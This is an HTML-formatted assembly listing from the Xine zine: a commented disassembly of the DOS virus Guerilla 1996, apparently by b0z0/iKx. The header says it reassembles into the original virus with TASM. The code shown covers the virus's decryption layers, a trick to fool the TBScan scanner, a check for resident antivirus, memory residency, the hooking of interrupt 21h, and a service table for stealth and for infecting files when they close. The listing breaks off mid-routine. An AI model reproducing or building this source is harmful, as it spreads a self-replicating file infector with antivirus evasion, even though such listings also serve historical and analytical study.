<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>guerilla.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 032 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">;лл                                                  лл</span><span class="sc0">
</span><span class="sc1">;лл                      GUERILLA 1996 Disassembly                       лл</span><span class="sc0">
</span><span class="sc1">;лл                             by b0z0/iKx                              лл</span><span class="sc0">
</span><span class="sc1">;лл                                                                      лл</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : Guerilla 1996</span><span class="sc0">
</span><span class="sc1">; Virus Author  : PH (?)</span><span class="sc0">
</span><span class="sc1">; Virus Lenght  : 1996</span><span class="sc0">
</span><span class="sc1">; Virus Type    : TSR EXE infector, Full stealth, Polymorphic</span><span class="sc0">
</span><span class="sc1">; Hooked Ints   : 21h</span><span class="sc0">
</span><span class="sc1">; Hooked Funcs. : 09h,11h,12h,32h,3Dh,3Eh,4Bh,4Ch,4Eh,4Fh,6Ch</span><span class="sc0">
</span><span class="sc1">; Infect on     : Close (3Eh)</span><span class="sc0">
</span><span class="sc1">; Payloads      : None</span><span class="sc0">
</span><span class="sc1">; Compiling     : Use TASM 3.0 to get the original Guerilla.1996</span><span class="sc0">
</span><span class="sc1">;                       TASM guerilla.asm</span><span class="sc0">
</span><span class="sc1">;                       TLINK guerilla</span><span class="sc0">
</span><span class="sc1">;                 Other compilers may not exactly reproduce the first gen.</span><span class="sc0">
</span><span class="sc1">; AV report     :</span><span class="sc0">
</span><span class="sc1">;                       TBScan 7.06: '#' flag on all infected files</span><span class="sc0">
</span><span class="sc1">;                       Fprot 2.26: Detect it. (from 2.26 up)</span><span class="sc0">
</span><span class="sc1">;                       AVP 2.22 (updated bases): Nothing</span><span class="sc0">
</span><span class="sc1">;                             - The virus is (for what AVP says :) ) </span><span class="sc0">
</span><span class="sc1">;                               found with an updated base for AVP 3.0b...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; For more informations (for example about the poly and infection</span><span class="sc0">
</span><span class="sc1">; method) check around the code! I prefeered to put some long comments and</span><span class="sc0">
</span><span class="sc1">; major explanations at the parts that are more interesting instead of</span><span class="sc0">
</span><span class="sc1">; writing 500 lines of intro ;-)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">virus_lenght</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_lenght_para</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(((</span><span class="sc5">virus_lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">virus_lenght_file</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">virus_end_file</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">first_enc_lenght</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">first_encr_end</span><span class="sc4">-</span><span class="sc5">first_encr_start</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">second_encrypt_lenght</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">end_second_encrypt</span><span class="sc4">-</span><span class="sc5">start_second_encrypt</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------  guerilla   ----</span><span class="sc0">

</span><span class="sc5">guerilla</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
                   </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">guerilla</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">guerilla</span><span class="sc0">

</span><span class="sc1">; Virus Entry Point</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">; Delta offset in BP</span><span class="sc0">
</span><span class="sc5">fill_poly_3</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">fill_poly_5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">                     </span><span class="sc1">; Fool Tbscan</span><span class="sc0">
</span><span class="sc5">fill_poly_6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">first_layer_enc</span><span class="sc0">         </span><span class="sc1">; Decryption routine</span><span class="sc0">

</span><span class="sc1">; Everything after this line up to first_encr_end will be encrypted by</span><span class="sc0">
</span><span class="sc1">; the first encryption routine</span><span class="sc0">

</span><span class="sc5">first_encr_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">             </span><span class="sc1">; Clear carry flag</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">second_encr</span><span class="sc0">             </span><span class="sc1">; Second Decryption routine</span><span class="sc0">

</span><span class="sc1">; Everything after this line up to enc_second_encrypt will be encrypted by</span><span class="sc0">
</span><span class="sc1">; the second encryption routine</span><span class="sc0">

</span><span class="sc5">start_second_encrypt</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; get DOS version in al</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">; Runs only on DOS 5 or</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_dos_version</span><span class="sc0">          </span><span class="sc1">; higher</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">resume_orig_exe</span><span class="sc0">
</span><span class="sc5">ok_dos_version</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">dollar_char</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS:DX points on '$'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                    </span><span class="sc1">; Write a char</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">3135h</span><span class="sc0">                </span><span class="sc1">; Residency check</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">resume_orig_exe</span><span class="sc0">         </span><span class="sc1">; Go away if resident!</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; DS=0 -&gt; to IVT</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Push Int21h offset</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Push Int21h offset</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Push Int21h segment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Push Int21h segment</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sec_int21_segment</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Save segment</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fir_int21_segment</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Save segment</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sec_int21_offset</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Save offset</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fir_int21_offset</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Save offset</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; DI = 0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">tsr_av_check</span><span class="sc0">            </span><span class="sc1">; Look for TSR AVs</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">resume_orig_exe</span><span class="sc0">         </span><span class="sc1">; If Z then an AV is resident</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; ES Last memory block</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; AX on MCB</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">                  </span><span class="sc1">; Is the last MCB?</span><span class="sc0">
                </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">resume_orig_exe</span><span class="sc0">         </span><span class="sc1">; Less -&gt; No, go away</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Lenght of the MB</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">virus_lenght_para</span><span class="sc0">    </span><span class="sc1">; Substract our lenght</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">resume_orig_exe</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; DI+11h = PSP + 02h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virus_lenght_para</span><span class="sc0">    </span><span class="sc1">; That is segment limit</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">               </span><span class="sc1">; Put new lenght in MCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; and in the PSP</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; DS on IVT</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21h_handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">     </span><span class="sc1">; Set our int21h handler</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">; Copy to ES:DI, ES:0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virus_lenght</span><span class="sc0">         </span><span class="sc1">; Number of bytes to copy</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; LEA si,[bp+0]</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">; Copy the virus in memory</span><span class="sc0">

</span><span class="sc5">resume_orig_exe</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">            </span><span class="sc1">; ADD ax,10h</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">victim_cs</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                </span><span class="sc1">; ADD ax,_add_to_ax_</span><span class="sc0">
</span><span class="sc5">add_to_ax</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; This will be changed in the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; infection phase to reflect the</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">                     </span><span class="sc1">; original SS:SP</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Zero all registers</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">; Give control to the host</span><span class="sc0">
</span><span class="sc5">victim_ip</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">victim_cs</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0FFF0h</span><span class="sc0">



</span><span class="sc1">; Virus Int 21h handler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int21h_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Push flags</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; Zero register</span><span class="sc0">
</span><span class="sc5">function_check_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hooked_services</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_interesting_fc</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">hooked_services</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">not_interesting_fc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Look trought our table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                  </span><span class="sc1">; if the service is of our</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">function_check_loop</span><span class="sc0">     </span><span class="sc1">; interest</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">jmp_to_old_int21h</span><span class="sc0">       </span><span class="sc1">; Jump to old 21h handler</span><span class="sc0">

</span><span class="sc1">; End of virus int 21h handler</span><span class="sc0">


</span><span class="sc1">; Table with hooked services and respective jumps to it's procedure</span><span class="sc0">

</span><span class="sc5">hooked_services</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4bh</span><span class="sc0">                     </span><span class="sc1">; AH=4Bh - EXECUTE</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_execute</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4ch</span><span class="sc0">                     </span><span class="sc1">; AH=4Ch - TERMINATE</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_execute</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">09h</span><span class="sc0">                     </span><span class="sc1">; AH=09h - VIRUS CHECK</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_virus_check</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11h</span><span class="sc0">                     </span><span class="sc1">; AH=11h - FINDFIRST FCB</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_fcb_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">                     </span><span class="sc1">; AH=12h - FINDNEXT FCB</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_fcb_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4eh</span><span class="sc0">                     </span><span class="sc1">; AH=4Eh - FINDFIRST DTA</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_dta_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4fh</span><span class="sc0">                     </span><span class="sc1">; AH=4Fh - FINDNEXT DTA</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_dta_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3dh</span><span class="sc0">                     </span><span class="sc1">; AH=3Dh - OPEN</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_open_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3eh</span><span class="sc0">                     </span><span class="sc1">; AH=3Eh - CLOSE</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_close_infect</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6ch</span><span class="sc0">                     </span><span class="sc1">; AH=6Ch - EXTENDED OPEN</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_open_stealth</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32h</span><span class="sc0">                     </span><span class="sc1">; AH=32h - GET DPB</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int_execute</span><span class="sc0">
</span><span class="sc5">end_hooked_services</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Int_Execute is called on 4Bh (EXECUTE), 32h (Get DPB), 4Ch (TERMINATE).</span><span class="sc0">
</span><span class="sc1">; If the call is a 4Bh then the virus will check if an antivirus or a</span><span class="sc0">
</span><span class="sc1">; special program from it's table is running (ex. windoze) and if this</span><span class="sc0">
</span><span class="sc1">; is true then it will totally disable stealth.</span><span class="sc0">
</span><span class="sc1">; If the call is a 4Ch then the virus will simple reenable stealth.</span><span class="sc0">
</span><span class="sc1">; If the call is a 32h (used by program such as CHKDSK) the virus will</span><span class="sc0">
</span><span class="sc1">; disable stealth to evitate strange reports to the user.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">int_execute</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
